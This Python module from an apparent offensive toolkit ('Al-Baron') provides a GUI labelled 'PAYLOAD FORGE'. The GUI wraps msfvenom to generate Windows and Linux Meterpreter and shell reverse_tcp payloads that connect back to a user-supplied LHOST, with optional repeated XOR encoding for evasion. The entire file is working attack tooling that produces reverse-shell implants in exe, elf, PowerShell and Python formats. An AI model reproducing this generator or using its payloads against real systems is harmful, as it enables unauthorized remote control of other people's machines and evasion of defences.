# language: Python, file: modules/payload.py
# Al-Baron Payload Module — full UI + msfvenom generation
import customtkinter as ctk
import subprocess
import threading
import os

class PayloadModule:
    def __init__(self, log_queue):
        self.log = log_queue
        self.name = "payload"
        self._parent = None
        self.out = None

    def render(self, parent):
        self._parent = parent
        ctk.CTkLabel(parent, text="PAYLOAD FORGE", font=ctk.CTkFont(size=18, weight="bold"), text_color="#ffd700").pack(pady=(20, 4), padx=24, anchor="w")
        ctk.CTkLabel(parent, text="msfvenom · reverse shells · encoders · obfuscation", font=ctk.CTkFont(size=11), text_color="#8a8a8a").pack(pady=(0, 12), padx=24, anchor="w")

        # Configuration
        cfg = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        cfg.pack(fill="x", padx=24)
        
        r1 = ctk.CTkFrame(cfg, fg_color="transparent")
        r1.pack(fill="x", padx=12, pady=6)
        self.lhost = ctk.CTkEntry(r1, placeholder_text="LHOST (your IP)", width=160, height=32, fg_color="#05080c", border_color="#1a2332")
        self.lhost.pack(side="left", padx=(0, 6))
        self.lport = ctk.CTkEntry(r1, placeholder_text="LPORT", width=90, height=32, fg_color="#05080c", border_color="#1a2332")
        self.lport.insert(0, "4444")
        self.lport.pack(side="left", padx=(0, 6))
        
        self.ptype = ctk.CTkOptionMenu(r1, values=["windows/x64/meterpreter/reverse_tcp", "linux/x64/meterpreter/reverse_tcp", "windows/x64/shell/reverse_tcp"], width=300, fg_color="#1a2332", button_color="#1a2332")
        self.ptype.pack(side="left", padx=(0, 6))

        r2 = ctk.CTkFrame(cfg, fg_color="transparent")
        r2.pack(fill="x", padx=12, pady=6)
        self.format = ctk.CTkOptionMenu(r2, values=["exe", "elf", "ps1", "raw", "python"], width=90, fg_color="#1a2332", button_color="#1a2332")
        self.format.pack(side="left", padx=(0, 6))
        self.encoder = ctk.CTkOptionMenu(r2, values=["none", "x64/xor_dynamic"], width=150, fg_color="#1a2332", button_color="#1a2332")
        self.encoder.pack(side="left", padx=(0, 6))
        
        ctk.CTkButton(r2, text="⚡ GENERATE PAYLOAD", width=180, height=32, fg_color="#2b2000", hover_color="#554400", text_color="#ffd700", command=self._generate).pack(side="left")

        # Output
        ctk.CTkLabel(parent, text="Console Output:", font=ctk.CTkFont(size=12, weight="bold"), text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")
        self.out = ctk.CTkTextbox(parent, fg_color="#05080c", text_color="#ffd700", font=ctk.CTkFont(family="Consolas", size=10), height=400)
        self.out.pack(fill="both", expand=True, padx=24, pady=(0, 24))

    def _generate(self):
        lhost = self.lhost.get().strip()
        lport = self.lport.get().strip()
        if not lhost:
            self._safe_out("[!] LHOST required")
            return

        ptype = self.ptype.get()
        fmt = self.format.get()
        enc = self.encoder.get()
        outfile = f"payload.{fmt}"

        cmd = ["msfvenom", "-p", ptype, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", outfile]
        if enc != "none":
            cmd.extend(["-e", enc, "-i", "3"])

        self._safe_out(f"[*] Running: {' '.join(cmd)}")
        
        def run():
            try:
                p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                for line in p.stdout:
                    self._safe_out(line.rstrip())
                p.wait()
                if os.path.exists(outfile):
                    size = os.path.getsize(outfile)
                    self._safe_out(f"\n[+] SUCCESS: Payload saved to {outfile} ({size} bytes)")
            except FileNotFoundError:
                self._safe_out("[!] msfvenom not installed.")
        threading.Thread(target=run, daemon=True).start()

    def _safe_out(self, text):
        if not self._parent: return
        def _u():
            if self.out and self.out.winfo_exists():
                self.out.insert("end", text + "\n")
                self.out.see("end")
        self._parent.after(0, _u)
